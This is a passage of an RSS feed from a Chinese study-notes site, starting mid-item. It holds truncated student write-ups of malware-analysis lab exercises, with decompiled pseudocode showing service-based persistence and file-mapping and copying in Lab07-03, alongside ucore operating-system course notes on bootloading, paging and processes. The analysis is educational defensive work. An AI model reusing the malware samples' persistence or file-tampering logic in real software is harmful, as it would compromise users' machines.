我们先分析这个程序的结构，查看 _main 函数的伪代码：
int __cdecl main(int argc, const char **argv, const char **envp) { SERVICE_TABLE_ENTRYA ServiceStartTable; // [sp+0h] [bp-10h]@1 int v5; // [sp+8h] [bp-8h]@1 int v6; // [sp+Ch] [bp-4h]@1 ServiceStartTable.lpServiceName = aMalservice; ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)sub_401040; v5 = 0; v6 = 0; StartServiceCtrlDispatcherA(&amp;amp;ServiceStartTable); return sub_401040(0, 0, ServiceStartTable.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/07/lab7-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/07/lab7-2/</guid><description>lab 7-2 # QUESTION 1 # How does this program achieve persistence?
我们同样的通过 _main 函数开始分析：
int __cdecl main(int argc, const char **argv, const char **envp) { OLECHAR *v3; // esi@3 LPVOID ppv; // [sp+0h] [bp-24h]@2 VARIANTARG pvarg; // [sp+4h] [bp-20h]@3 __int16 v7; // [sp+14h] [bp-10h]@3 int v8; // [sp+1Ch] [bp-8h]@3 if ( OleInitialize(0) &amp;gt;= 0 ) { CoCreateInstance(&amp;amp;rclsid, 0, 4u, &amp;amp;riid, &amp;amp;ppv); if ( ppv ) { VariantInit(&amp;amp;pvarg); v7 = 3; v8 = 1; v3 = SysAllocString(psz); (*(void (__stdcall **)(LPVOID, OLECHAR *, __int16 *, VARIANTARG *, VARIANTARG *, VARIANTARG *))(*(_DWORD *)ppv + 44))( ppv, v3, &amp;amp;v7, &amp;amp;pvarg, &amp;amp;pvarg, &amp;amp;pvarg); SysFreeString(v3); } OleUninitialize(); } return 0; } 查看被调用的所有函数，这个程序似乎并没有尝试永久地运行。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/07/lab7-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/07/lab7-3/</guid><description>lab 7-3 # QUESTION 1 # How does this program achieve persistence to ensure that it continues running when the computer is restarted?
首先查看函数导入表，发现 Lab07-03.exe 这个文件有导入一个 CopyFileA 这个敏感函数。
然后我们分析这个可执行文件的伪代码。伪代码定义了大量局部变量后，先进行如下的判断：
if ( argc == 2 &amp;amp;&amp;amp; !strcmp(argv[1], aWarning_this_w) ) 该判断的作用是判断命令行参数长度是否为 2，第二个参数内容是否为 WARNING_THIS_WILL_DESTROY_YOUR_MACHINE。
以下几行的伪代码，通过查看 MSDN 的 API 函数介绍可以阅读其功能：
v3 = CreateFileA(FileName, 0x80000000, 1u, 0, 3u, 0, 0); hObject = v3; v4 = CreateFileMappingA(v3, 0, 2u, 0, 0, 0); v5 = (char *)MapViewOfFile(v4, 4u, 0, 0, 0); v6 = v5; argca = (int)v5; v7 = CreateFileA(ExistingFileName, 0x10000000u, 1u, 0, 3u, 0, 0); v50 = v7; if ( v7 == (HANDLE)-1 ) exit(0); v8 = CreateFileMappingA(v7, 0, 4u, 0, 0, 0); if ( v8 == (HANDLE)-1 ) exit(0); v9 = (const char **)MapViewOfFile(v8, 0xF001Fu, 0, 0, 0); argva = v9; if ( !</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/09/lab9-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/09/lab9-1/</guid><description>lab 9-1 # QUESTION 1 # How can you get this malware to install itself?
在 BinaryCollection/ 文件夹下运行 diff 命令可以查看两个文件之间的差异：
$ diff Chapter_9L/Lab09-01.exe Chapter_3L/Lab03-04.exe # 没有返回值说明这两个文件没有任何不同 我们发现 Lab09-01.exe 与 Lab03-04.exe 是同一个文件。在 Lab03-04 中，我们的分析结果是这个文件运行起来就直接闪退并且把自己删除了。
我们先用 PE Explorer 查看这个函数的导入表内容：
可见它导入的动态链接库以及其中调用的函数都非常敏感：
KERNEL32.dll 中的 CopyFileA()、WriteFile() 等操作文件的函数， CreateProcess() 等操作进程、互斥量等相关的函数； ADVAPI32.dll 中的 RegSetValueExA() 等操作注册表的函数，CreateService()、DeleteService() 等控制系统服务的函数； SHELL32.dll 动态链接库仅导入了一个函数，但非常敏感：ShellExecuteA()； WS2_32.dll 则是 Windows Socket 编程中最常用的动态链接库，这说明这个程序会有网络请求。 然后我们用 Ida Pro 打开这个文件，查看其中的 main 函数伪代码，发现其中的主要代码结构是一个如下的 if 语句结构：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/09/lab9-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/09/lab9-2/</guid><description>lab 9-2 # QUESTION 1 # What strings do you see statically in the binary?
首先使用 PEexplorer 中的反汇编功能查看其中的 .rdata 段：
QUESTION 2 # What happens when you run this binary?
运行程序，没有任何反应。 使用 Process Monitor 查看，存在一些文件和注册表操作。
QUESTION 3 # How can you get this sample to run its malicious payload?
QUESTION 4 #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/3.%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/3.%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/</guid><description>进程间通信 # 进程间需要通信，我们需要设计一了良好的结构，不使用中断的方式实现。在本节中将讨论进程间通信（Inter Process Comminucation, IPC）的问题。
竞争条件 # 什么是竞争条件？
竞争条件 (race condition)：两个或多个进程共同读写某些共享资源，而最后的执行解决取决于进行运行时间的精确时序时，这种情况称为竞争条件。 怎样避免竞争条件？
互斥 (mutual exclusion)：以某种手段确保当一个进程在使用一个资源时，其他进程就不能对资源的做同样的操作； 我们把共享的内存进行访问的程序片段称作临界区域 (critical region)。如果我们通过合适的安排使得两个进程不可能同时处于临界区，就能够避免竞争条件。 忙等待的互斥 # 下面列举的这些实现互斥的方案，绝对性地禁止了两个进程共享一个资源：
屏蔽中断：顾名思义，一个进程或线程进入临界区域之后立即屏蔽所有中断，离开之前再打开中断；
锁变量：一种软件层面的解决方案。即设置一个共享的锁变量，其初始值为 0：
一个线程想要进入临界区之前需要先测试锁变量的值，为 1 则继续等待； 如果为 0，则线程进入这个临界区，并且将锁变量的值设置为 1，离开时重置； 显然，但其实这种方法仍然会有概率导致多个线程同时进入临界区。
严格轮换法：设置一个变量用于记录当前可以进入临界区的线程，各个线程连续测试这个变量是否出现给定的值。这种方式称为忙等待 (busy waiting)，忙于等待的锁称为自旋锁 (spin lock)。
由于这种方式是浪费 CPU 时间的，通常会避免。只有在有理由认为等待时间非常短的情况下，才使用。
Peterson 解法：荷兰数学家 T.Dekker 提出的一种不需要严格轮换的软件互斥算法。后来 Peterson 发现了一种更简单的互斥算法。
这个算法的核心是 enter_region 与 leave_rigion 这样两个函数，比如我们有 2 个线程：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe1/</guid><description>exe1 # make # make命令执行需要一个makefile文件，以告诉make命令需要如何去编译和链接程序。
如果工程没有被编译过，所有的c文件都要编译并被链接。 如果某几个c文件被修改，那么只编译被修改的c文件，并链接目标程序。 如果工程的头文件被修改了，那么需要编译引用了这几个头文件的c文件，并链接目标程序 target... : prerequisites... command ... ... target也就是一个目标文件，可以是object file,也可以是执行文件。还可以是一个label。prerequisites就是要生成target所需要的文件或是目标。command就是make需要执行的命令。target这一个或多个的目标文件依赖于prerequisites中的文件，其生成规则定义在command中。如果prerequisites中有一个以上的文件比target文件要新，那么command所定义的命令就会被执行。
问题 1 # 操作系统镜像文件ucore.img是如何一步一步生成的?(需要比较详细地解释Makefile中每 一条相关命令和命令参数的含义,以及说明命令导致的结果)
ucore.img # makefile中生成ucore.img的代码为：
UCOREIMG := $(call totarget,ucore.img) $(UCOREIMG): $(kernel) $(bootblock) $(V)dd if=/dev/zero of=$@ count=10000 $(V)dd if=$(bootblock) of=$@ conv=notrunc $(V)dd if=$(kernel) of=$@ seek=1 conv=notrunc $(call create_target,ucore.img) 将ucore.img传入totarget表达式调用call函数结果赋值给变量UCOREIMG，UCOREIMG作为target，其依赖于两个文件，一个是kernel，一个是bootblock。接下来给出make需要执行的命令。首先从/dev/zero中读了10000*512块的空字节，生成空文件，接着将bootlock中的内容拷贝到目标文件，然后从输文件的512字节后继续写入kernel的内容。makefile的第六行V := @将@赋值给变量V，所以$(V)代指@,表示命令不回显。conv=notrunc代表不截断输出文件，count=n’ 代表从输入文件中拷贝n个大小为ibs byte的块，ibs默认为512字节。seek=n代表在拷贝前输出文件时跳过n 个‘obs’-byte的块。obs默认为512字节。所以seek=1代表跳过输出文件的512个字节。
kenel：
kernel = $(call totarget,kernel) $(kernel): tools/kernel.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe2/</guid><description>exe2 # 使用 qemu 执行并调试 lab1 中的软件。
为了更加简易地对 gdb 进行调试，我们应该安装 peda。但是我发现这个内核调试的版本并不能显示颜色，很多乱码，所以并没有什么卵用。
STEP-1 # 从 CPU 加电后执行的第一条指令开始，单步跟踪 BIOS 的执行
可以在 Makefile 的第 219-222 行看到 make 列举的命令中，有一个叫做 debug 的命令：
debug: $(UCOREIMG) $(V)$(QEMU) -S -s -parallel stdio -hda $&amp;lt; -serial null &amp;amp; $(V)sleep 2 $(V)$(TERMINAL) -e &amp;#34;gdb -q -tui -x tools/gdbinit&amp;#34; 这三行命令分别执行：
使用 qemu 运行 32 位程序的虚拟机，这个变量值在 Makefile 的 27 行进行赋值，在我的 Ubuntu 中这个变量的最终赋值是 qemu-system-i386。要查看上面各个命令的含义使用 manual 即可：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe3/</guid><description>exe3 # 问题1 # 为何开启 A20,以及如何开启 A20
为了与早期的pc机兼容，物理地址线20(实模式)置于低位不能使用。所以超过1MB的地址，默认就会返回到地址0。寻址空间只有1MB。
开启A20：
seta20.1: inb $0x64, %al # Wait for not busy(8042 input buffer empty). testb $0x2, %al jnz seta20.1 movb $0xd1, %al # 0xd1 -&amp;gt; port 0x64 outb %al, $0x64 # 0xd1 means: write data to 8042&amp;#39;s P2 port 从0x64端口读入一个字节的数据到al中，如果a1第二位不为0，则跳转到seta20.1接着执行检查a1的第二位是不是0。将0xd1写入到al中，再将al中的数据写入到端口0x64中。
seta20.2: inb $0x64, %al # Wait for not busy(8042 input buffer empty). testb $0x2, %al jnz seta20.2 movb $0xdf, %al # 0xdf -&amp;gt; port 0x60 outb %al, $0x60 # 0xdf = 11011111, means set P2&amp;#39;s A20 bit(the 1 bit) to 1 从0x64端口读入一个字节的数据到al中，如果a1第二位不为0，则跳转到seta20.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe4/</guid><description>exe4 # 分析 bootloader 加载 ELF 格式的 OS 的过程
bootmian.c # 让我们简单地翻译一下这个文件的注释：
磁盘内存布局：
这个程序是一个启动加载器 (bootloader)，它应该在磁盘的第一个扇区上； 紧接着的第二个扇区存储着内核的镜像，它必须是一个 ELF 格式的文件。 启动的流程：
当 CPU 启动时，它首先将 BIOS 加载进内存中，然后执行它； 然后 BIOS 会初始化中断周期，然后取出启动程序的第一个选区然后跳转到它； 如果启动加载器存储在第一个扇区，控制权就转移到了这个文件中的代码（具体是在 bootasm.S 这个文件中调用的 bootmain() 这个函数）； 当这个文件中的函数执行完毕之后，内核会被读入，控制权会被转移给内核。 问题一 # Boot loader 如何读取硬盘扇区的？
我们看文件中函数 readsect 的注释，就知道用来读取硬盘扇区的是这个函数，我们来逐行解释这个函数：
/* readsect - read a single sector at @secno into @dst */ static void readsect(void *dst, uint32_t secno) { // wait for disk to be ready waitdisk(); outb(0x1F2, 1); // count = 1 outb(0x1F3, secno &amp;amp; 0xFF); outb(0x1F4, (secno &amp;gt;&amp;gt; 8) &amp;amp; 0xFF); outb(0x1F5, (secno &amp;gt;&amp;gt; 16) &amp;amp; 0xFF); outb(0x1F6, ((secno &amp;gt;&amp;gt; 24) &amp;amp; 0xF) | 0xE0); outb(0x1F7, 0x20); // cmd 0x20 - read sectors // wait for disk to be ready waitdisk(); // read a sector insl(0x1F0, dst, SECTSIZE / 4); } 看文件前的注释可知，函数两个参数的含义：dst 是目标句柄，secno 是扇区标示； 根据参考资料，后面的几行是通过 24-bit LBA 的方式读取磁盘（下面进行详细解析）； 后面的 insl 函数则是读取四个字节到 dst 这个句柄中； 那么 outb 那几行的具体原理是什么呢，首先我们在 Linux manual 上找到了函数原型：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe5/</guid><description>exe5 # 程序思路：函数kern/debug/kdebug.c::print_stackframe的注释写的很清楚了，先调用read_ebp(),read_eip()读出 ebp 和 eip 的指并打印出来。然后输出四个参数的值，由 ebp 开始向上找两位所保存的值是第一个参数，以此类推。然后找到下一个函数栈的 eip 和 ebp,下一个函数的 eip 就是压入栈的返回地址，也就是当前 ebp 向上找一位所保存的值，下一个函数的 ebp 就是当前 ebp 保存的地址所指向的地方。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe6/</guid><description>exe6 # 写在前面： # 阅读源码时，发现了一个之前没有遇到过的 c 语言语法：
struct struct_name { unsigned field1: 16; unsigned field2: 16; }; 这个结构声明表示声明了一个名为 struct_name，同时有 field1、field2 这两个 16 位字段的结构。（同时发现 64 位计算器的结构大小一定是 4 个字节的整数倍，不足则向上 padding）
问题一 # 中断描述表（保护模式下的中断向量表）中，一个表项占多少个字节？其中哪几位代表中断处理代码的入口？
中断描述表定义在 kern/trap/trap.c 这个文件中：
/* * * Interrupt descriptor table: * * Must be built at run time because shifted function addresses can&amp;#39;t * be represented in relocation records. * */ static struct gatedesc idt[256] = {{0}}; 其中 gatedesc 这个结构定义在 kern/mm/mmu.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/personal_summary/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/personal_summary/</guid><description>@石博：
遇到的首要问题就是读不懂 linux 命令与汇编，感谢 bing.com，为什么不感谢 google 呢，因为我翻不了墙啊，服务器太贵了租不起。然后就是读出来的 ebp 和 eip 值我当成了指针，直接当指针使用了，报错很清晰，改完程序就ok了，完结撒花。 @佘崧林：
熟悉了解了操作系统的底层中断机制 石博牛逼</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab2/exe0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab2/exe0/</guid><description>exe0 # 概述 # 首先我们看看 lab1 与 lab2 的代码有什么不同：
在 ucore_os_lab 这个项目中添加不同的 repo，用以回滚到最原始的版本：
$ git remote -v origin https://github.com/chyyuu/ucore_os_lab.git (fetch) origin https://github.com/chyyuu/ucore_os_lab.git (push) $ git remote add upstream https://github.com/chyyuu/ucore_os_lab $ git remote -v origin https://github.com/chyyuu/ucore_os_lab.git (fetch) origin https://github.com/chyyuu/ucore_os_lab.git (push) upstream https://github.com/chyyuu/ucore_os_lab (fetch) upstream https://github.com/chyyuu/ucore_os_lab (push) 拉取主仓中最新的代码，并且切换到远程的 master 分支：
$ git pull upstream master From https://github.com/chyyuu/ucore_os_lab * branch master -&amp;gt; FETCH_HEAD * [new branch] master -&amp;gt; upstream/master Already up to date.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab2/exe2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab2/exe2/</guid><description>exe2 # 概述 # 通过设置页表和对应的页表项，可建立虚拟内存地址和物理内存地址的对应关系。其中的 get_pte 函数是设置页表项环节中的一个重要步骤。此函数找到一个虚地址对应的二级页表项 的内核虚地址，如果此二级页表项不存在，则分配一个包含此项的二级页表。
本练习需要补全kern/mm/pmm.c 文件中的 get_pte 函数，实现其功能。请仔细查看和理解 get_pte 函数中的注释。
函数原型如下：
pte_t *get_pte(pde_t *pgdir, uintptr_t la, bool create); 我们先来翻译一下这个函数的注释：
函数 get_pte 的相关注释：
作用：通过页目录项和逻辑地址，取得对应的页表；如果页表不存在则会分配这个页表； 参数：pgdir：页目录项；la：逻辑地址；create：是否创建新的页表； 返回值：内核对应页表的虚拟地址。 在对应的头文件 pmm.h 与 mmu.h 中，定义了一些你可能会用到宏和函数：
PDX(la)：通过一个进程的虚拟逻辑地址，求得一个页目录项的索引； PTX(la)：通过一个进程的虚拟逻辑地址，求得一个页表项的索引； KADDR(pa)：通过一个物理地址，返回一个对应的内核虚拟地址； set_page_ref(page, 1)：将页的引用计数加一； page2pa(page)：通过一个页表项，得到它实际的物理地址； struct Page * alloc_page()：分配一个内存页； memset(void *s, char c, size_t n)：将指针 s 之后的 n 个区域的内容设置为 c； PTE_P：存在；PTE_W：写；PTE_U：读。 问题一 # 请描述页目录项 (Page Directory Entry) 和页表 (Page Table Entry) 中每个组成部分的含义和以及对 ucore 而言的潜在用处。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab3/exe0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab3/exe0/</guid><description>exe0 # 同 lab2：
导出 change：
$ git diff 7ca90137c09c54f5afa9b87a35a68d9f65ecef52 HEAD labcodes/lab2/ | sed &amp;#39;s/lab2/lab3/g&amp;#39; &amp;gt; lab3/exe0.patch 进行 merge：
$ git apply lab3/exe0.patch</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab3/exe1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab3/exe1/</guid><description>如果ucore的缺页服务例程在执行过程中访问内存,出现了页访问异常,请问硬件要做哪 些事情?
将产生页访问异常的线性地址存入 cr2 寄存器中 并且给出 错误码 error_code 说明是页访问异常的具体原因
error_code : the error code recorded in trapframe-&amp;gt;tf_err which is setted by x86 hardware
将其 存入 trapframe 中 tf_err 等到中断服务例程 调用页访问异常处理函数do_pgfault() 时 再判断 具体原因 若不在某个VMA的地址范围内 或 不满足正确的读写权限 则是非法访问 若在此范围 且 权限也正确 则 认为是 合法访问 只是没有建立虚实对应关系 应分配一页 并修改页表 完成 虚拟地址到 物理地址的映射 刷新 TLB.重新执行引发页访问异常的 那条指令.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab3/exe2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab3/exe2/</guid><description>exe2 # 代码 # _fifo_map_swappable # FIFA 算法需要将最近使用过的页链接在链表的头部。
看注释，这个函数是要将刚刚使用过的 page 放在链表的第二个元素。程序已经将链表和元素都选取出来了：
list_entry_t *head=(list_entry_t*) mm-&amp;gt;sm_priv; list_entry_t *entry=&amp;amp;(page-&amp;gt;pra_page_link); 因此我们只需要调用 list_entry_t 中的方法即可：
list_add(head, entry); _fifo_swap_out_victim # FIFA 算法需要将最长时间未使用过的页从链表的尾部去除。
看注释我们需要做的事情是删除尾部，并且用 ptr_page 这个参数指向被替换的页：
static int _fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, int in_tick) { list_entry_t *head=(list_entry_t*) mm-&amp;gt;sm_priv; assert(head != NULL &amp;amp;&amp;amp; in_tick==0); list_entry_t *tail = head-&amp;gt;prev; // Select the victim assert(tail != head); // this isn&amp;#39;t a one-element-list *ptr_page = le2page(tail, pra_page_link); // (2) assign the value of *ptr_page to the addr of this page list_del(tail); // (1) unlink the earliest arrival page in front of pra_list_head qeueue assert(*ptr_page !</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab4/exe0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab4/exe0/</guid><description>exe0 # 同 lab2：
导出 change：
$ git diff 776bc9ece6f0f887962603c0eadf779d1443ecbd HEAD labcodes/lab3/ | sed &amp;#39;s/lab3/lab4/g&amp;#39; &amp;gt; lab4/exe0.patch 进行 merge：
$ git apply lab4/exe0.patch</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab4/exe1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab4/exe1/</guid><description>exe1 # 代码 # alloc_proc 函数（位于 kern/process/proc.c 中）负责分配并返回一个新的 struct proc_struct 结构，用于存储新建立的内核线程的管理信息。ucore 需要对这个结构进行最基本的初始化，你需要完成这个初始化过程。
问题 # 请说明 proc_struct 中 struct context context 和 struct trapframe *tf 成员变量含义和在本实验中的作用是啥？（提示通过看代码和编程调试可以判断出来）
Context：声明
struct context { uint32_t eip; uint32_t esp; uint32_t ebx; uint32_t ecx; uint32_t edx; uint32_t esi; uint32_t edi; uint32_t ebp; }; 在进程切换时，用于保存进程运行状态的寄存器的值的变量； Trapeframe：声明：
struct trapframe { struct pushregs tf_regs; uint16_t tf_gs; uint16_t tf_padding0; uint16_t tf_fs; uint16_t tf_padding1; uint16_t tf_es; uint16_t tf_padding2; uint16_t tf_ds; uint16_t tf_padding3; uint32_t tf_trapno; /* below here defined by x86 hardware */ uint32_t tf_err; uintptr_t tf_eip; uint16_t tf_cs; uint16_t tf_padding4; uint32_t tf_eflags; /* below here only when crossing rings, such as from user to kernel */ uintptr_t tf_esp; uint16_t tf_ss; uint16_t tf_padding5; } __attribute__((packed)); 